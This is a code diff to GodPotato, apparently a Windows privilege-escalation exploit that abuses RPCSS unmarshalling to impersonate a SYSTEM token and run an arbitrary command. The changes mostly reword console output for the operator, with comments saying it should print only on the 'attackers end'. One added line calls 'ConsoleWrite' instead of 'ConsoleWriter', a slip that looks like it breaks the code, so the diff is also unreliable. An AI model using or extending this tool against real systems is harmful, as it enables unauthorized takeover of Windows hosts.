@@ -67,6 +67,10 @@ namespace GodPotato
                 }
             }
 
+            // Execution Logging 
+            // WIP - Print on ONLY attackers end
+            ConsoleWrite.WriteLine("[+] Mashing 'taters started...");
+
             try
             {
                 GodPotatoContext godPotatoContext = new GodPotatoContext(ConsoleWriter, Guid.NewGuid().ToString());
@@ -84,34 +88,44 @@ namespace GodPotato
                 GodPotatoUnmarshalTrigger unmarshalTrigger = new GodPotatoUnmarshalTrigger(godPotatoContext);
                 try
                 {
-                    ConsoleWriter.WriteLine("[*] Trigger RPCSS");
+                    ConsoleWriter.WriteLine("[*] Exploiting RPCSS...");
                     int hr = unmarshalTrigger.Trigger();
                     ConsoleWriter.WriteLine("[*] UnmarshalObject: 0x{0:x}", hr);
                     
                 }
                 catch (Exception e)
                 {
-                    ConsoleWriter.WriteLine(e);
+                    // Make Failure more apparent
+                    // WIP - Print on ONLY attackers end
+                    ConsoleWriter.WriteLine("[X] Trigger Error: " + e.Message);
                 }
 
 
                 WindowsIdentity systemIdentity = godPotatoContext.GetToken();
                 if (systemIdentity != null)
                 {
-                    ConsoleWriter.WriteLine("[*] CurrentUser: " + systemIdentity.Name);
+                    // Adjust to provide Username ASAP and assess Command Execution
+                    ConsoleWriter.WriteLine("[+] Successfully Impersonated User: " + systemIdentity.Name);
+                    ConsoleWriter.WriteLine("[#] Executing Command: " + potatoArgs.cmd);
+                    
                     TokenuUils.createProcessReadOut(ConsoleWriter, systemIdentity.Token, potatoArgs.cmd);
 
+                    // Informa Person that command ran properly without timing out
+                    // WIP - Print on ONLY attackers end
+                    ConsoleWriter.WriteLine("[+] Command Execution Completed.");
                 }
                 else
                 {
-                    ConsoleWriter.WriteLine("[!] Failed to impersonate security context token");
+                    ConsoleWriter.WriteLine("[X] Failed to impersonate security context token");
                 }
                 godPotatoContext.Restore();
                 godPotatoContext.Stop();
             }
             catch (Exception e)
             {
-                ConsoleWriter.WriteLine("[!] " + e.Message);
+                // Make Failure more clear 
+                // // WIP - Print on ONLY attackers end
+                ConsoleWriter.WriteLine("[X] FATAL ERROR: " + e.Message);
 
             }
 
